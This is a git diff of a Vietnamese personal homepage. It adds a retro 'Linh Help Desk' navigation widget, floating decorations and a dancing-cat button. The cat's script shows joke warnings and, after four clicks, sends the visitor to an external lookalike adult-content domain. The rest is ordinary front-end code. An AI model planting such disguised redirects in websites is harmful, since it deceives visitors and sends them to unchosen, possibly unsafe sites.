@@ -303,6 +303,19 @@ img { max-width: 100%; height: auto; display: block; }
 </head>
 <body>
 
+<button class="dancing-cat" id="dancingCat" type="button" aria-label="Chú mèo đang nhảy">
+  <img src="img/decor-dancing-cat.png" alt="Mèo nhảy múa" />
+  <span aria-live="polite">meow! ✦</span>
+</button>
+<div class="retro-decor" aria-hidden="true">
+  <img class="retro-decor__item retro-decor__windows" src="img/decor-windows.png" alt="" />
+  <img class="retro-decor__item retro-decor__phone" src="img/decor-phone.png" alt="" />
+  <img class="retro-decor__item retro-decor__linux" src="img/decor-linux.png" alt="" />
+  <img class="retro-decor__item retro-decor__finder" src="img/decor-finder.png" alt="" />
+  <img class="retro-decor__item retro-decor__switch" src="img/decor-switch.png" alt="" />
+  <img class="retro-decor__item retro-decor__toaster" src="img/decor-toaster.png" alt="" />
+</div>
+
 
 <style>
   *, *::before, *::after { cursor: none !important; } /* Đè chết mọi cursor khác */
@@ -438,6 +451,35 @@ img { max-width: 100%; height: auto; display: block; }
     display: none;
   }
 </style>
+
+<script>
+  (function () {
+    var cat = document.getElementById('dancingCat');
+    if (!cat) return;
+    var bubble = cat.querySelector('span');
+    var clicks = 0;
+    var bubbleTimer;
+    var warnings = [
+      'Ơ… đừng bấm nhiều quá!',
+      'Mình đã nhắc rồi đó nha!',
+      'Thêm một lần nữa là không ổn đâu…',
+      'Bạn đã được cảnh báo. Tạm biệt!'
+    ];
+    cat.addEventListener('click', function () {
+      clicks += 1;
+      bubble.textContent = warnings[Math.min(clicks - 1, warnings.length - 1)];
+      cat.classList.add('is-happy');
+      clearTimeout(bubbleTimer);
+      if (clicks >= warnings.length) {
+        cat.disabled = true;
+        cat.setAttribute('aria-label', 'Mèo đã cảnh báo và đang chuyển trang');
+        setTimeout(function () { window.location.assign('https://only-fans.uk/ddad'); }, 1150);
+        return;
+      }
+      bubbleTimer = setTimeout(function () { cat.classList.remove('is-happy'); }, 2200);
+    });
+  }());
+</script>
 
 <script>
   (function() {
@@ -938,33 +980,40 @@ function toggleMenu() {
 
       <h1 id="hero-title" style="margin: 0; font-size: 3rem; text-align: center;">LINH OsiMi Wellcome to my page!</h1>
 
-      <section class="linh-portal" id="linh-portal" aria-label="Cánh cửa khám phá Linh Osimi">
-        <div class="linh-portal__topline"><span></span> MINI QUEST <span></span></div>
-        <div class="linh-portal__scene" id="portalScene">
-          <span class="linh-portal__spark linh-portal__spark--one"></span>
-          <span class="linh-portal__spark linh-portal__spark--two"></span>
-          <span class="linh-portal__spark linh-portal__spark--three"></span>
-          <button class="linh-portal__door" id="portalDoor" type="button" aria-expanded="false" aria-describedby="portalHint">
-            <span class="linh-portal__door-frame">
-              <span class="linh-portal__glow"></span>
-              <span class="linh-portal__inside"><img src="img/assistant-character.gif" alt="Người dẫn đường của Linh Osimi" /></span>
-              <span class="linh-portal__leaf linh-portal__leaf--left"><i></i></span>
-              <span class="linh-portal__leaf linh-portal__leaf--right"><i></i></span>
-              <span class="linh-portal__rune">LO</span>
-            </span>
-          </button>
+      <section class="linh-helpdesk" id="linhHelpDesk" aria-label="Linh Help Desk">
+        <div class="linh-helpdesk__bar">
+          <span class="linh-helpdesk__app-icon">✦</span>
+          <strong>Linh Help Desk</strong>
+          <span class="linh-helpdesk__progress" id="helpDeskProgress">0/12 khám phá</span>
+          <button class="linh-helpdesk__close" id="helpDeskClose" type="button" aria-label="Đóng Help Desk">×</button>
         </div>
-        <div class="linh-portal__hud">
-          <div class="linh-portal__level"><span>LV. 01</span><b>KHÁM PHÁ LINH-OSIMI</b><span id="portalScore">0 / 3</span></div>
-          <div class="linh-portal__meter"><i id="portalProgress"></i></div>
-          <p class="linh-portal__dialogue" id="portalHint" aria-live="polite">Chạm vào cánh cửa để bắt đầu hành trình.</p>
-          <div class="linh-portal__actions" id="portalActions" hidden>
-            <button type="button" data-portal-target="#profile-section" data-portal-text="Bạn đã mở hồ sơ của Linh. Cuộn xuống để khám phá câu chuyện!">Hồ sơ Linh</button>
-            <button type="button" data-portal-target="#my-projects" data-portal-text="Quest mới: ghé qua kho dự án của Linh.">Kho dự án</button>
-            <button type="button" data-portal-target="#topicsScroll" data-portal-text="Bản đồ đã mở: chọn một thế giới bạn muốn xem.">Bản đồ chủ đề</button>
+        <div class="linh-helpdesk__main">
+          <div class="linh-helpdesk__mascot">
+            <span class="linh-helpdesk__mascot-label">GUIDE ONLINE</span>
+            <img src="img/assistant-character.gif" alt="Nhân vật hướng dẫn của Linh Osimi" />
+          </div>
+          <div class="linh-helpdesk__choices" id="helpDeskChoices" aria-label="Các lựa chọn hội thoại">
+            <button type="button" data-helpdesk="about">Trang web này có gì?</button>
+            <button type="button" data-helpdesk="linh">Linh Osimi là ai?</button>
+            <button type="button" data-helpdesk="projects">Mở kho dự án</button>
+            <button type="button" data-helpdesk="topics">Tôi muốn khám phá chủ đề</button>
+            <button type="button" data-helpdesk="music" data-helpdesk-href="am-nhac.html">Có gì để nghe không?</button>
+            <button type="button" data-helpdesk="map">Bản đồ toàn website</button>
           </div>
         </div>
+        <div class="linh-helpdesk__dialogue" aria-live="polite">
+          <span class="linh-helpdesk__cursor">›</span>
+          <p id="helpDeskText">Bạn muốn mình giúp khám phá điều gì?</p>
+          <button id="helpDeskGo" type="button" hidden>Đi tới →</button>
+        </div>
+        <div class="linh-helpdesk__conversation" id="helpDeskConversation" aria-live="polite"></div>
+        <div class="linh-helpdesk__routes" id="helpDeskRoutes" hidden>
+          <div class="linh-helpdesk__routes-head"><span>✦</span><strong id="helpDeskRoutesTitle">Chọn điểm đến tiếp theo</strong><button type="button" id="helpDeskBack">Quay lại</button></div>
+          <label class="linh-helpdesk__search"><span>⌕</span><input id="helpDeskSearch" type="search" placeholder="Tìm manga, game, 3D, Discord..." autocomplete="off" /></label>
+          <div class="linh-helpdesk__route-grid" id="helpDeskRouteGrid"></div>
+        </div>
       </section>
+      <button class="linh-helpdesk__reopen" id="helpDeskReopen" type="button" hidden>Mở Linh Help Desk</button>
         <div class="hero-content" style="max-width: 1200px; ..."></div>
         
         <div class="profile-section" id="profile-section" style="display: flex; align-items: center; justify-content: center; gap: 30px; max-width: 800px; width: 100%; flex-wrap: wrap; overflow: hidden;">
@@ -4155,47 +4204,206 @@ nav a, .logo-container span {
   @media (max-width:600px) { .linh-portal { margin:-27px auto 6px; } .linh-portal__scene { min-height:218px; } .linh-portal__door { width:157px; height:198px; } .linh-portal__inside img { width:126px; height:166px; } .linh-portal__hud { box-sizing:border-box; } .linh-portal__actions { grid-template-columns:1fr; } }
 </style>
 
+<style>
+  .linh-helpdesk { width:min(760px,100%); margin:-22px auto 10px; overflow:hidden; border:3px solid #f5f1d7; border-radius:8px 8px 3px 3px; color:#111; background:#e9e5cc; box-shadow:0 18px 40px rgba(0,0,0,.42),0 0 0 2px rgba(12,51,151,.72); font-family:Tahoma,Arial,sans-serif; text-align:left; }
+  .linh-helpdesk__bar { display:flex; align-items:center; min-height:35px; padding:0 6px; color:#fff; background:linear-gradient(180deg,#3281ef 0%,#0659ce 45%,#003aaf 100%); border-bottom:2px solid #f9d859; box-shadow:inset 0 1px rgba(255,255,255,.75); text-shadow:1px 1px #003487; }
+  .linh-helpdesk__app-icon { display:grid; place-items:center; width:20px; height:20px; margin-right:6px; border:1px solid rgba(255,255,255,.72); border-radius:3px; background:linear-gradient(135deg,#fff9ac,#ffb426); color:#0642a7; font-size:14px; text-shadow:none; }
+  .linh-helpdesk__bar strong { font-size:16px; letter-spacing:.2px; }
+  .linh-helpdesk__progress { margin-left:10px; padding:3px 6px; border:1px solid rgba(255,255,255,.42); border-radius:3px; color:#fff8c4; background:rgba(0,43,136,.45); font:700 10px/1 Tahoma,sans-serif; letter-spacing:.2px; }
+  .linh-helpdesk__close { margin-left:auto; width:25px; height:24px; border:1px solid #fff; border-radius:4px; color:#fff; background:linear-gradient(135deg,#ff806c,#d41b0d); box-shadow:inset 1px 1px rgba(255,255,255,.72),1px 1px #00348a; font:700 23px/18px Arial,sans-serif; cursor:pointer; text-shadow:1px 1px #7a0b04; }
+  .linh-helpdesk__main { display:grid; grid-template-columns:40% 60%; min-height:270px; background:linear-gradient(135deg,#d8d0a1 0 13%,#f0ecd7 13% 87%,#d8d0a1 87%); border-bottom:2px solid #a9a58d; }
+  .linh-helpdesk__mascot { position:relative; display:flex; align-items:end; justify-content:center; overflow:hidden; border-right:2px solid #aaa58d; background:linear-gradient(145deg,rgba(255,255,255,.38),rgba(219,211,169,.45)); }
+  .linh-helpdesk__mascot::after { content:""; position:absolute; inset:15px 18px 0; border:1px solid rgba(80,75,49,.16); border-bottom:0; border-radius:74px 74px 0 0; pointer-events:none; }
+  .linh-helpdesk__mascot-label { position:absolute; z-index:2; left:12px; top:12px; padding:4px 6px; color:#f5f2d7; background:#1c54b5; border:1px solid #f8edb7; border-radius:3px; font:700 9px/1 Tahoma,sans-serif; letter-spacing:1px; }
+  .linh-helpdesk__mascot img { position:relative; z-index:1; width:min(220px,95%); max-height:256px; object-fit:contain; object-position:center bottom; filter:drop-shadow(4px 3px 0 rgba(39,34,33,.25)); transform:translateY(5px); }
+  .linh-helpdesk__choices { display:flex; flex-direction:column; justify-content:center; gap:9px; padding:20px 22px; }
+  .linh-helpdesk__choices button { min-height:37px; border:2px solid #92bafc; border-radius:10px; padding:8px 15px; color:#fff; background:linear-gradient(180deg,#2c7ff3,#0750be); box-shadow:inset 0 2px 2px rgba(255,255,255,.36),0 2px 0 #003994; font:700 15px/1.2 Tahoma,Arial,sans-serif; text-align:center; cursor:pointer; text-shadow:1px 1px #013481; transition:transform .12s ease,filter .12s ease; }
+  .linh-helpdesk__choices button:hover,.linh-helpdesk__choices button:focus-visible { transform:translateX(-4px); filter:brightness(1.14); outline:2px solid #fff4a9; outline-offset:2px; }
+  .linh-helpdesk__choices button.is-selected { border-color:#fff2a3; background:linear-gradient(180deg,#ed6e9e,#ad2360); box-shadow:inset 0 2px 2px rgba(255,255,255,.35),0 2px 0 #6f1238; }
+  .linh-helpdesk__dialogue { display:flex; align-items:center; gap:9px; min-height:72px; padding:12px 18px; border-top:1px solid #fffced; background:#f0ecd9; font-family:Georgia,serif; }
+  .linh-helpdesk__dialogue p { flex:1; margin:0; font-size:19px; line-height:1.35; text-align:center; }
+  .linh-helpdesk__cursor { color:#0a51bd; font:700 35px/1 Tahoma,sans-serif; animation:helpDeskBlink 1s steps(2,end) infinite; }
+  .linh-helpdesk__dialogue button,.linh-helpdesk__reopen { border:2px solid #114fae; border-radius:5px; padding:7px 11px; color:#fff; background:linear-gradient(#5495f8,#0750bd); box-shadow:inset 1px 1px rgba(255,255,255,.65); font:700 12px Tahoma,sans-serif; cursor:pointer; white-space:nowrap; }
+  .linh-helpdesk__conversation { display:flex; flex-direction:column; gap:5px; max-height:115px; padding:0 16px 10px; overflow:auto; background:#f0ecd9; scrollbar-width:thin; }
+  .linh-helpdesk__message { max-width:88%; margin:0; padding:6px 9px; border:1px solid #beb8a1; border-radius:5px; color:#24211a; background:#fffdf2; font:12px/1.35 Tahoma,Arial,sans-serif; box-shadow:inset 0 1px #fff; }
+  .linh-helpdesk__message--user { align-self:flex-end; border-color:#7aa5e8; color:#083a92; background:#dceaff; }
+  .linh-helpdesk__routes { padding:10px 14px 14px; border-top:2px solid #b9b295; background:linear-gradient(180deg,#ded7b5,#f0ecd9); }
+  .linh-helpdesk__routes-head { display:flex; align-items:center; gap:6px; margin-bottom:9px; color:#173f8e; font:700 12px/1 Tahoma,sans-serif; }
+  .linh-helpdesk__routes-head > span { color:#ee8e19; font-size:16px; } .linh-helpdesk__routes-head strong { flex:1; }
+  .linh-helpdesk__routes-head button { border:1px solid #a99d74; border-radius:3px; padding:3px 6px; color:#40402d; background:#f8f4dc; font:11px Tahoma,sans-serif; cursor:pointer; }
+  .linh-helpdesk__search { display:flex; align-items:center; gap:5px; margin:0 0 9px; border:1px solid #9c9a88; border-radius:4px; padding:4px 7px; color:#0a50bd; background:#fffdf1; }
+  .linh-helpdesk__search span { font:700 19px/1 Georgia,serif; } .linh-helpdesk__search input { width:100%; border:0; outline:0; color:#222; background:transparent; font:12px Tahoma,Arial,sans-serif; }
+  .linh-helpdesk__route-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:7px; }
+  .linh-helpdesk__route-card { display:flex; align-items:center; gap:7px; min-height:39px; border:1px solid #8cabdf; border-radius:5px; padding:6px 7px; color:#073d97; background:linear-gradient(180deg,#fff,#dce9ff); box-shadow:inset 0 1px #fff,0 1px #a6a18c; font:700 11px/1.15 Tahoma,Arial,sans-serif; text-align:left; cursor:pointer; transition:transform .12s ease,background .12s ease; }
+  .linh-helpdesk__route-card:hover,.linh-helpdesk__route-card:focus-visible { transform:translateY(-2px); border-color:#084bac; color:#fff; background:linear-gradient(180deg,#4389ed,#0750bb); outline:0; }
+  .linh-helpdesk__route-card span { display:grid; flex:0 0 23px; place-items:center; width:23px; height:23px; border-radius:50%; color:#fff; background:#276bd1; font-size:13px; }
+  .linh-helpdesk__reopen { display:block; margin:-5px auto 20px; }
+  .linh-helpdesk__reopen[hidden] { display:none; }
+  .linh-helpdesk.is-hidden { display:none; }
+  @keyframes helpDeskBlink { 50% { opacity:.15; } }
+  @media (max-width:650px) { .linh-helpdesk { margin:-25px auto 10px; } .linh-helpdesk__main { grid-template-columns:1fr; } .linh-helpdesk__mascot { display:none; } .linh-helpdesk__choices { padding:16px; gap:8px; } .linh-helpdesk__choices button { font-size:14px; } .linh-helpdesk__dialogue p { font-size:16px; } .linh-helpdesk__route-grid { grid-template-columns:repeat(2,1fr); } }
+  .dancing-cat { position:fixed; z-index:10040; left:18px; bottom:14px; width:112px; padding:0; border:0; background:transparent; cursor:pointer; filter:drop-shadow(0 10px 12px rgba(0,0,0,.38)); animation:dancingCat 1.5s ease-in-out infinite; }
+  .dancing-cat img { display:block; width:100%; height:auto; mix-blend-mode:screen; } .dancing-cat span { position:absolute; left:82%; top:7%; min-width:max-content; padding:4px 7px; border:1px solid rgba(255,255,255,.7); border-radius:999px; color:#2c1831; background:#fff5d8; font:700 11px/1 Tahoma,Arial,sans-serif; opacity:0; transform:translateY(8px); transition:opacity .2s ease,transform .2s ease; pointer-events:none; }
+  .dancing-cat:hover,.dancing-cat.is-happy { animation-play-state:paused; transform:rotate(-7deg) scale(1.1); } .dancing-cat:hover span,.dancing-cat.is-happy span { opacity:1; transform:translateY(0); }
+  .retro-decor { position:fixed; inset:0; z-index:3; pointer-events:none; overflow:hidden; } .retro-decor__item { position:absolute; opacity:.52; mix-blend-mode:screen; filter:drop-shadow(0 8px 14px rgba(0,0,0,.28)); animation:decorFloat 5s ease-in-out infinite; }
+  .retro-decor__windows { top:132px; left:3vw; width:52px; transform:rotate(-10deg); } .retro-decor__phone { top:25vh; right:3vw; width:92px; animation-delay:-1.1s; } .retro-decor__linux { right:3vw; bottom:14vh; width:74px; animation-delay:-2.2s; } .retro-decor__finder { left:4vw; bottom:18vh; width:62px; animation-delay:-.6s; } .retro-decor__switch { top:52vh; left:2vw; width:80px; animation-delay:-3.2s; } .retro-decor__toaster { right:16vw; bottom:5vh; width:76px; animation-delay:-4s; }
+  @keyframes dancingCat { 0%,100% { transform:translateY(0) rotate(-3deg); } 45% { transform:translateY(-18px) rotate(5deg); } 65% { transform:translateY(-5px) rotate(-1deg); } }
+  @keyframes decorFloat { 50% { transform:translateY(-12px) rotate(5deg); } }
+  @media (max-width:768px) { .retro-decor__phone,.retro-decor__linux,.retro-decor__finder,.retro-decor__switch,.retro-decor__toaster { display:none; } .retro-decor__windows { top:76px; left:9px; width:34px; opacity:.38; } .dancing-cat { left:9px; bottom:8px; width:72px; } .dancing-cat span { left:62%; top:-5%; font-size:9px; } }
+  @media (prefers-reduced-motion:reduce) { .dancing-cat,.retro-decor__item { animation:none; } }
+</style>
+
 <script>
   (function () {
-    var scene = document.getElementById('portalScene');
-    var door = document.getElementById('portalDoor');
-    var hint = document.getElementById('portalHint');
-    var actions = document.getElementById('portalActions');
-    var score = document.getElementById('portalScore');
-    var progress = document.getElementById('portalProgress');
-    if (!scene || !door || !hint || !actions) return;
+    var desk = document.getElementById('linhHelpDesk');
+    var choices = document.getElementById('helpDeskChoices');
+    var text = document.getElementById('helpDeskText');
+    var go = document.getElementById('helpDeskGo');
+    var close = document.getElementById('helpDeskClose');
+    var reopen = document.getElementById('helpDeskReopen');
+    var conversation = document.getElementById('helpDeskConversation');
+    var routes = document.getElementById('helpDeskRoutes');
+    var routesTitle = document.getElementById('helpDeskRoutesTitle');
+    var routeGrid = document.getElementById('helpDeskRouteGrid');
+    var back = document.getElementById('helpDeskBack');
+    var search = document.getElementById('helpDeskSearch');
+    var progress = document.getElementById('helpDeskProgress');
+    if (!desk || !choices || !text || !go || !conversation || !routes || !routeGrid || !search || !progress) return;
 
-    var completed = [];
-    try { completed = JSON.parse(localStorage.getItem('linhPortalQuest') || '[]'); } catch (error) { completed = []; }
-    function updateQuest() {
-      var count = Math.min(completed.length, 3);
-      score.textContent = count + ' / 3';
-      progress.style.width = (count / 3 * 100) + '%';
+    var answers = {
+      about: 'Đây là góc nhỏ của Linh Osimi — nơi có project, manga, game, nhạc, kiến thức và vài điều vui vẻ để khám phá.',
+      linh: 'Mình là người dẫn đường của Linh. Chọn “Đi tới” để xem lời giới thiệu ngay trong trang chủ.',
+      projects: 'Đã đánh dấu Kho dự án! Ở đó có các project web, game và những thử nghiệm của Linh.',
+      topics: 'Bản đồ chủ đề đã sẵn sàng: manga, game, phim, nghệ thuật, khoa học và nhiều hơn nữa.',
+      music: 'Có chứ! Mình dẫn bạn đến phòng âm nhạc của Linh nhé.',
+      map: 'Đây là bản đồ toàn website. Chọn một điểm đến hoặc dùng ô tìm kiếm để khám phá nhanh.'
+    };
+    var targetMap = { linh: '#profile-section', projects: '#my-projects', topics: '#topicsScroll' };
+    var routesMap = {
+      about: [
+        { icon:'💼', label:'Kho dự án', target:'#my-projects', reply:'Mở kho dự án của Linh.' },
+        { icon:'📚', label:'Manga', href:'manga0/0/truyen-manga.html', reply:'Đưa bạn đến thế giới manga.' },
+        { icon:'🎮', label:'Game', href:'game0/0/game.html', reply:'Chuyển sang khu trò chơi.' },
+        { icon:'🎬', label:'Phim', href:'phim0/0/phim.html', reply:'Đưa bạn đến góc phim ảnh.' },
+        { icon:'🎵', label:'Âm nhạc', href:'am-nhac.html', reply:'Mở phòng âm nhạc.' },
+        { icon:'🔭', label:'Khoa học', href:'khoa-hoc0/0/khoa-hoc.html', reply:'Khám phá chuyên mục khoa học.' }
+      ],
+      linh: [
+        { icon:'👤', label:'Hồ sơ Linh', target:'#profile-section', reply:'Đây là phần giới thiệu của Linh.' },
+        { icon:'🏆', label:'Thành tích', href:'achievements.html', reply:'Mở bảng thành tích.' },
+        { icon:'🧩', label:'Dự án nổi bật', target:'#my-projects', reply:'Xem những dự án nổi bật.' }
+      ],
+      projects: [
+        { icon:'🚀', label:'Xem project', target:'#my-projects', reply:'Đi tới kho dự án.' },
+        { icon:'🤖', label:'Discord Bot', href:'discordbot45/discordbot.html', reply:'Mở dự án Discord Bot.' },
+        { icon:'🪐', label:'Không gian 3D', href:'3d/room/room.html', reply:'Bước vào không gian 3D.' }
+      ],
+      topics: [
+        { icon:'📚', label:'Manga', href:'manga0/0/truyen-manga.html', reply:'Mở kệ manga.' },
+        { icon:'🎮', label:'Game', href:'game0/0/game.html', reply:'Mở khu game.' },
+        { icon:'🎬', label:'Phim', href:'phim0/0/phim.html', reply:'Mở khu phim.' },
+        { icon:'🎨', label:'Nghệ thuật', href:'nghe-thuat0/nghe-thuat.html', reply:'Mở phòng nghệ thuật.' },
+        { icon:'🔭', label:'Khoa học', href:'khoa-hoc0/0/khoa-hoc.html', reply:'Mở khu khoa học.' },
+        { icon:'🎵', label:'Âm nhạc', href:'am-nhac.html', reply:'Mở phòng âm nhạc.' }
+      ],
+      music: [
+        { icon:'🎵', label:'Vào phòng nhạc', href:'am-nhac.html', reply:'Mở phòng âm nhạc ngay.' },
+        { icon:'▶', label:'Video yêu thích', target:'.video-gallery-section', reply:'Cuộn đến thư viện video.' }
+      ]
+    };
+    var allRoutes = [
+      { id:'profile', icon:'👤', label:'Hồ sơ Linh', target:'#profile-section', reply:'Mở phần giới thiệu của Linh.' },
+      { id:'projects', icon:'💼', label:'Kho dự án', target:'#my-projects', reply:'Mở kho dự án.' },
+      { id:'manga', icon:'📚', label:'Manga', href:'manga0/0/truyen-manga.html', reply:'Mở thế giới manga.' },
+      { id:'game', icon:'🎮', label:'Game', href:'game0/0/game.html', reply:'Mở khu trò chơi.' },
+      { id:'film', icon:'🎬', label:'Phim', href:'phim0/0/phim.html', reply:'Mở góc phim ảnh.' },
+      { id:'music', icon:'🎵', label:'Âm nhạc', href:'am-nhac.html', reply:'Mở phòng âm nhạc.' },
+      { id:'art', icon:'🎨', label:'Nghệ thuật', href:'nghe-thuat0/nghe-thuat.html', reply:'Mở phòng nghệ thuật.' },
+      { id:'science', icon:'🔭', label:'Khoa học', href:'khoa-hoc0/0/khoa-hoc.html', reply:'Mở khu khoa học.' },
+      { id:'discord', icon:'🤖', label:'Discord Bot', href:'discordbot45/discordbot.html', reply:'Mở dự án Discord Bot.' },
+      { id:'three-d', icon:'🪐', label:'Không gian 3D', href:'3d/room/room.html', reply:'Bước vào không gian 3D.' },
+      { id:'achievements', icon:'🏆', label:'Thành tích', href:'achievements.html', reply:'Mở bảng thành tích.' },
+      { id:'videos', icon:'▶', label:'Video yêu thích', target:'.video-gallery-section', reply:'Cuộn đến thư viện video.' }
+    ];
+    routesMap.map = allRoutes;
+    var selected = null;
+    var activeRoutes = [];
+    var visited = [];
+    try { visited = JSON.parse(localStorage.getItem('linhHelpDeskVisited') || '[]'); } catch (error) { visited = []; }
+    function routeId(route) { return route.href || route.target || route.label; }
+    function updateProgress() {
+      progress.textContent = Math.min(visited.length, allRoutes.length) + '/' + allRoutes.length + ' khám phá';
     }
-    function writeHint(text) { hint.textContent = text; }
-    function openDoor() {
-      if (scene.classList.contains('is-open')) return;
-      scene.classList.add('is-open');
-      door.setAttribute('aria-expanded', 'true');
-      actions.hidden = false;
-      writeHint('Cánh cửa đã mở! Người dẫn đường đang chờ bạn chọn một nhiệm vụ.');
-      if (completed.indexOf('open') === -1) completed.push('open');
-      localStorage.setItem('linhPortalQuest', JSON.stringify(completed));
-      updateQuest();
+    function markVisited(route) {
+      var id = routeId(route);
+      if (visited.indexOf(id) === -1) visited.push(id);
+      localStorage.setItem('linhHelpDeskVisited', JSON.stringify(visited));
+      updateProgress();
     }
-    door.addEventListener('click', openDoor);
-    actions.addEventListener('click', function (event) {
-      var button = event.target.closest('[data-portal-target]');
+    function addMessage(message, type) {
+      var item = document.createElement('p');
+      item.className = 'linh-helpdesk__message' + (type === 'user' ? ' linh-helpdesk__message--user' : '');
+      item.textContent = message;
+      conversation.appendChild(item);
+      conversation.scrollTop = conversation.scrollHeight;
+    }
+    function renderRoutes(key, query) {
+      activeRoutes = routesMap[key] || [];
+      var normalizedQuery = String(query || '').trim().toLocaleLowerCase();
+      var items = activeRoutes.filter(function (route) {
+        return !normalizedQuery || (route.label + ' ' + route.reply).toLocaleLowerCase().indexOf(normalizedQuery) > -1;
+      });
+      routes.hidden = !activeRoutes.length;
+      routeGrid.replaceChildren();
+      if (!items.length) {
+        routesTitle.textContent = 'Không tìm thấy điểm đến phù hợp';
+        return;
+      }
+      routesTitle.textContent = key === 'map' ? 'Bản đồ toàn website — chọn một điểm đến' : 'Bạn muốn đi đâu tiếp theo?';
+      items.forEach(function (route) {
+        var button = document.createElement('button');
+        button.type = 'button';
+        button.className = 'linh-helpdesk__route-card';
+        button.innerHTML = '<span></span><b></b>';
+        button.querySelector('span').textContent = route.icon;
+        button.querySelector('b').textContent = (visited.indexOf(routeId(route)) > -1 ? '✓ ' : '') + route.label;
+        button.addEventListener('click', function () {
+          addMessage('Bạn chọn: ' + route.label, 'user');
+          text.textContent = route.reply;
+          addMessage(route.reply, 'guide');
+          markVisited(route);
+          renderRoutes(selected, search.value);
+          if (route.href) { setTimeout(function () { window.location.href = route.href; }, 420); return; }
+          var target = document.querySelector(route.target);
+          if (target) setTimeout(function () { target.scrollIntoView({ behavior: 'smooth', block: 'start' }); }, 420);
+        });
+        routeGrid.appendChild(button);
+      });
+    }
+    choices.addEventListener('click', function (event) {
+      var button = event.target.closest('[data-helpdesk]');
       if (!button) return;
-      var target = document.querySelector(button.getAttribute('data-portal-target'));
-      var quest = button.getAttribute('data-portal-target');
-      writeHint(button.getAttribute('data-portal-text'));
-      if (completed.indexOf(quest) === -1) completed.push(quest);
-      localStorage.setItem('linhPortalQuest', JSON.stringify(completed));
-      updateQuest();
-      if (target) setTimeout(function () { target.scrollIntoView({ behavior: 'smooth', block: 'start' }); }, 380);
+      selected = button.getAttribute('data-helpdesk');
+      choices.querySelectorAll('button').forEach(function (item) { item.classList.toggle('is-selected', item === button); });
+      text.textContent = answers[selected];
+      addMessage('Bạn hỏi: ' + button.textContent, 'user');
+      addMessage(answers[selected], 'guide');
+      search.value = '';
+      renderRoutes(selected);
+      go.hidden = !targetMap[selected] && !button.getAttribute('data-helpdesk-href');
+      go.dataset.target = targetMap[selected] || '';
+      go.dataset.href = button.getAttribute('data-helpdesk-href') || '';
     });
-    updateQuest();
+    go.addEventListener('click', function () {
+      if (go.dataset.href) { window.location.href = go.dataset.href; return; }
+      var target = document.querySelector(go.dataset.target);
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+    search.addEventListener('input', function () { renderRoutes(selected, search.value); });
+    back.addEventListener('click', function () { routes.hidden = true; text.textContent = 'Bạn muốn mình giúp khám phá điều gì tiếp theo?'; });
+    close.addEventListener('click', function () { desk.classList.add('is-hidden'); reopen.hidden = false; });
+    reopen.addEventListener('click', function () { desk.classList.remove('is-hidden'); reopen.hidden = true; });
+    updateProgress();
   }());
 </script>
 
